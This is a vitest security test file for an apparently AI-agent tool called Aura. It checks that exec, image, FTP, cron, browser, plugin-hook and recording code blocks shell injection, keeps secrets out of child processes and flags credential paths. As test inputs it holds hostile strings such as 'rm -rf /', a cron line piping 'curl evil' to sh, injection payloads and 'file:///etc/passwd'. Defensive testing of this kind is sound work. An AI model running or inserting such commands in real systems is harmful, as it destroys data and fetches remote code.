import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import { run, minimalEnv, hasCommand } from '../../src/util/exec.js';
import { imageRead, sniffImage } from '../../src/tools/image-read.js';

// 1×1 transparent PNG
const PNG = Buffer.from(
  '89504e470d0a1a0a0000000d4948445200000001000000010806000000'
  + '1f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082', 'hex');

let dir: string;
beforeEach(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'aura-sec-')); });
afterEach(() => { fs.rmSync(dir, { recursive: true, force: true }); vi.unstubAllEnvs(); });

describe('util/exec', () => {
  it('passes shell metacharacters through as one literal argument', () => {
    const canary = path.join(dir, 'pwned');
    const evil = `"; touch ${canary}; echo "$(touch ${canary})`;
    const r = run('printf', ['%s', evil]);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe(evil);
    expect(fs.existsSync(canary)).toBe(false);
  });

  it('keeps provider keys and tokens out of the child environment', () => {
    vi.stubEnv('OPENAI_API_KEY', 'sk-secret');
    vi.stubEnv('TELEGRAM_BOT_TOKEN', 'tok');
    const env = minimalEnv();
    expect(env.OPENAI_API_KEY).toBeUndefined();
    expect(env.TELEGRAM_BOT_TOKEN).toBeUndefined();
    expect(env.PATH).toBe(process.env.PATH);
    const r = run('sh', ['-c', 'echo "${OPENAI_API_KEY:-none}"']);
    expect(r.stdout.trim()).toBe('none');
    expect(minimalEnv({ ONLY_THIS: 'x' }).ONLY_THIS).toBe('x');
  });

  it('reports a missing program instead of throwing', () => {
    const r = run('definitely-not-a-program-aura', []);
    expect(r.error).toBeDefined();
    expect(r.status).toBeNull();
    expect(hasCommand('definitely-not-a-program-aura')).toBe(false);
    expect(hasCommand('sh')).toBe(true);
    expect(hasCommand('sh; rm -rf /')).toBe(false);
  });
});

describe('image_read', () => {
  it('does not run anything hidden in the file name', async () => {
    // a file name can't hold '/', so the injected command writes to the cwd
    const canary = path.join(process.cwd(), 'aura-pwned-canary');
    const name = path.join(dir, 'a"; touch aura-pwned-canary; echo $(touch aura-pwned-canary) ".png');
    fs.writeFileSync(name, PNG);
    await imageRead({ path: name, action: 'info' });
    await imageRead({ path: name, action: 'ocr' });
    expect(fs.existsSync(canary)).toBe(false);
  });

  it('refuses to base64 a file that is not an image, whatever its name', async () => {
    const fake = path.join(dir, 'id_ed25519.png');
    fs.writeFileSync(fake, '-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n');
    const out = await imageRead({ path: fake, action: 'base64' });
    expect(typeof out).toBe('string');
    expect(out as string).toMatch(/^Error: .*not an image/);
    expect(out as string).not.toContain('OPENSSH');
  });

  it('still attaches a real image, even under another name', async () => {
    const p = path.join(dir, 'shot.bin');
    fs.writeFileSync(p, PNG);
    const out = await imageRead({ path: p, action: 'base64' });
    expect(typeof out).toBe('object');
    expect((out as { images: string[] }).images[0]).toMatch(/^data:image\/png;base64,/);
  });

  it('sniffs the common formats', () => {
    expect(sniffImage(PNG)).toBe('image/png');
    expect(sniffImage(Buffer.from('ffd8ffe000104a464946', 'hex'))).toBe('image/jpeg');
    expect(sniffImage(Buffer.from('GIF89a'))).toBe('image/gif');
    expect(sniffImage(Buffer.from('<?xml version="1.0"?>\n<svg xmlns="x"></svg>'))).toBe('image/svg+xml');
    expect(sniffImage(Buffer.from('{"apiKey":"x"}'))).toBeNull();
  });
});

describe('ftp_upload', () => {
  const fakeCurl = () => {
    const bin = path.join(dir, 'bin');
    fs.mkdirSync(bin);
    fs.writeFileSync(path.join(bin, 'curl'),
      `#!/bin/sh\nprintf '%s\\n' "$@" > "${dir}/argv"\ncat > "${dir}/stdin"\n`, { mode: 0o755 });
    vi.stubEnv('PATH', `${bin}:${process.env.PATH}`);
  };

  it('keeps the password out of argv and the URL', async () => {
    const { ftpUpload } = await import('../../src/tools/ftp-upload.js');
    fakeCurl();
    const f = path.join(dir, 'site.html');
    fs.writeFileSync(f, '<p>hi</p>');
    const out = ftpUpload({ host: 'ftp.example.com', username: 'me', password: 'p@ss"word', remoteDir: '/htdocs/', localFile: f });
    expect(out).toMatch(/^✓ Uploaded/);
    const argv = fs.readFileSync(path.join(dir, 'argv'), 'utf8');
    expect(argv).not.toContain('p@ss');
    expect(argv).toContain('ftp://ftp.example.com:21/htdocs/');
    expect(fs.readFileSync(path.join(dir, 'stdin'), 'utf8')).toBe('user = "me:p@ss\\"word"\n');
  });

  it('rejects values that would reshape the URL', async () => {
    const { ftpUpload } = await import('../../src/tools/ftp-upload.js');
    fakeCurl();
    const f = path.join(dir, 'x');
    fs.writeFileSync(f, 'x');
    const base = { host: 'ftp.example.com', username: 'u', password: 'p', remoteDir: '/a/', localFile: f };
    expect(ftpUpload({ ...base, host: 'evil.com/x?@ftp.example.com' })).toMatch(/^Error: invalid FTP host/);
    expect(ftpUpload({ ...base, remoteDir: '/a/ -o /etc/passwd' })).toMatch(/^Error: remoteDir/);
    expect(ftpUpload({ ...base, port: 0 })).toMatch(/^Error: invalid FTP port/);
    expect(ftpUpload({ ...base, password: 'a\nurl = "http://evil"' })).toMatch(/line breaks/);
    expect(fs.existsSync(path.join(dir, 'argv'))).toBe(false);
  });
});

describe('cron', () => {
  const fakeCrontab = () => {
    const bin = path.join(dir, 'bin');
    fs.mkdirSync(bin, { recursive: true });
    // -l prints the saved table (or fails like the real one); - saves stdin
    fs.writeFileSync(path.join(bin, 'crontab'),
      `#!/bin/sh\nif [ "$1" = "-l" ]; then cat "${dir}/tab" 2>/dev/null || exit 1; else cat > "${dir}/tab"; fi\n`, { mode: 0o755 });
    vi.stubEnv('PATH', `${bin}:${process.env.PATH}`);
  };

  it('saves $(…) and backticks literally instead of running them', async () => {
    const { cronTool } = await import('../../src/tools/cron.js');
    fakeCrontab();
    const canary = path.join(dir, 'pwned');
    const cmd = `echo "$(touch ${canary})" \`touch ${canary}\``;
    const out = await cronTool({ action: 'add', schedule: 'daily', command: cmd, label: 'x' });
    expect(out).toMatch(/Cron job added/);
    expect(fs.existsSync(canary)).toBe(false);
    expect(fs.readFileSync(path.join(dir, 'tab'), 'utf8')).toContain(cmd);
  });

  it('refuses a command or label that would add extra crontab lines', async () => {
    const { cronTool } = await import('../../src/tools/cron.js');
    fakeCrontab();
    expect(await cronTool({ action: 'add', schedule: 'daily', command: 'true\n* * * * * curl evil|sh' })).toMatch(/single line/);
    expect(await cronTool({ action: 'add', schedule: 'daily', command: 'true', label: 'a\nb' })).toMatch(/label/);
    expect(await cronTool({ action: 'add', schedule: '* * * * $(id)', command: 'true' })).toMatch(/Invalid schedule/);
    expect(fs.existsSync(path.join(dir, 'tab'))).toBe(false);
  });
});

describe('permissions: shell-running tools are all screened', () => {
  it('cron run/add get the same dangerous-command block as run_shell', async () => {
    const { PermissionSystem, shellCommandOf } = await import('../../src/safety/permissions.js');
    const bad = 'rm -rf /';
    for (const level of ['auto', 'normal'] as const) {
      const p = new PermissionSystem(level);
      expect(p.check('run_shell', { command: bad }).allowed).toBe(false);
      expect(p.check('cron', { action: 'run', command: bad }).allowed).toBe(false);
      expect(p.check('cron', { action: 'add', schedule: 'daily', command: bad }).allowed).toBe(false);
      expect(p.check('cron', { action: 'list' }).allowed).toBe(true);
    }
    expect(shellCommandOf('cron', { action: 'list' })).toBeNull();
  });

  it('in normal mode a new cron job always asks first', async () => {
    const { PermissionSystem } = await import('../../src/safety/permissions.js');
    const p = new PermissionSystem('normal');
    expect(p.check('cron', { action: 'add', schedule: 'daily', command: 'ls' }).needsConfirm).toBe(true);
    expect(p.check('run_shell', { command: 'ls' }).needsConfirm).toBeFalsy();
  });
});

describe('secret paths (Telegram /read /ls /sendfile /search)', () => {
  it('flags credential stores and files, not ordinary ones', async () => {
    const { isSecretPath } = await import('../../src/safety/secret-paths.js');
    const home = '/home/u';
    for (const p of ['/home/u/.ssh', '/home/u/.ssh/id_ed25519', '/home/u/.aura/telegram.json',
      '/home/u/proj/.env', '/home/u/proj/.env.local', '/srv/tls/server.key', '/home/u/.npmrc', '/tmp/id_rsa']) {
      expect(isSecretPath(p, home), p).toBe(true);
    }
    for (const p of ['/home/u/proj/README.md', '/home/u/Pictures/a.png', '/home/u/.aura-notes.md', '/home/u/proj/environment.ts']) {
      expect(isSecretPath(p, home), p).toBe(false);
    }
  });

  it('follows symlinks to the real file', async () => {
    const { isSecretPath } = await import('../../src/safety/secret-paths.js');
    fs.mkdirSync(path.join(dir, '.ssh'));
    fs.writeFileSync(path.join(dir, '.ssh', 'config'), 'x');
    fs.symlinkSync(path.join(dir, '.ssh', 'config'), path.join(dir, 'harmless.txt'));
    expect(isSecretPath(path.join(dir, 'harmless.txt'), dir)).toBe(true);
  });
});

describe('verify: only pure test-runner calls are re-run', () => {
  it('accepts plain runner invocations and nothing that carries shell syntax', async () => {
    const { testRunnerArgv } = await import('../../src/verify/checks.js');
    expect(testRunnerArgv('npm test')).toEqual(['npm', 'test']);
    expect(testRunnerArgv('npx vitest run tests/a.test.ts')).toEqual(['npx', 'vitest', 'run', 'tests/a.test.ts']);
    expect(testRunnerArgv('pytest -k foo')).toEqual(['pytest', '-k', 'foo']);
    expect(testRunnerArgv('go test ./...')).toEqual(['go', 'test', './...']);
    for (const bad of ['rm -rf build; npm test', 'npm test && curl x|sh', 'npm test $(id)', 'npm test `id`',
      'echo pytest', 'npm test\nrm -rf /', 'npm install && npm test', 'npm test > /etc/x']) {
      expect(testRunnerArgv(bad), bad).toBeNull();
    }
  });
});

describe('plugin hooks', () => {
  it('run without the provider keys in Aura\'s environment, but with the plugin vars', async () => {
    const { runHooks } = await import('../../src/plugins/hooks.js');
    vi.stubEnv('OPENAI_API_KEY', 'sk-should-not-leak');
    const out = await runHooks('PreToolUse', 'run_shell', { command: 'ls' }, [{
      event: 'PreToolUse', matcher: 'Bash', pluginName: 'p', pluginRoot: dir,
      command: 'echo "key=${OPENAI_API_KEY:-none} root=${CLAUDE_PLUGIN_ROOT}" >&2; exit 2',
    }], dir);
    expect(out.block).toBe(true);
    const msg = out.messages.join(' ');
    expect(msg).toContain('key=none');
    expect(msg).toContain(`root=${dir}`);
    expect(msg).not.toContain('sk-should-not-leak');
  });
});

describe('browser', () => {
  it('opens web pages only', async () => {
    const { refuseUrl } = await import('../../src/tools/browser.js');
    expect(refuseUrl('https://example.com/a?b=1')).toBeNull();
    expect(refuseUrl('http://localhost:5173/')).toBeNull();
    expect(refuseUrl('about:blank')).toBeNull();
    for (const bad of ['file:///etc/passwd', 'FILE:///home/u/.ssh/id_rsa', 'chrome://settings', 'javascript:alert(1)',
      'data:text/html,<script>1</script>', 'view-source:https://x', 'not a url']) {
      expect(refuseUrl(bad), bad).not.toBeNull();
    }
  });

  it('page scripts (evaluate) ask first in normal mode', async () => {
    const { PermissionSystem } = await import('../../src/safety/permissions.js');
    const p = new PermissionSystem('normal');
    expect(p.check('browser', { action: 'evaluate', script: 'document.cookie' }).needsConfirm).toBe(true);
    expect(p.check('browser', { action: 'goto', url: 'https://x' }).needsConfirm).toBeFalsy();
  });
});

describe(':catchthis recordings', () => {
  it('masks credential-shaped typed text but keeps paths and prose', async () => {
    const { redactSecrets } = await import('../../src/record/store.js');
    expect(redactSecrets('export OPENAI_API_KEY=sk-proj-AbCdEf0123456789xyzXYZ')).not.toContain('AbCdEf0123456789');
    expect(redactSecrets('ghp_1234567890abcdefghijABCDEFGHIJ12')).toBe('[redacted token]');
    expect(redactSecrets('token 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 ok')).toBe('token [redacted secret] ok');
    for (const keep of ['/home/dusan/Projects/coastline-drive/Assets/Scripts/PlayerController.cs',
      'open the invoices folder and rename every file', 'git commit -m "fix: thing"']) {
      expect(redactSecrets(keep)).toBe(keep);
    }
  });

  it('keeps the recordings folder private to the user', async () => {
    vi.stubEnv('AURA_HOME', dir);
    const { saveRecording, buildRecording, recordingsDir } = await import('../../src/record/store.js');
    saveRecording(buildRecording([], { title: 't' }));
    expect(fs.statSync(recordingsDir()).mode & 0o777).toBe(0o700);
  });
});
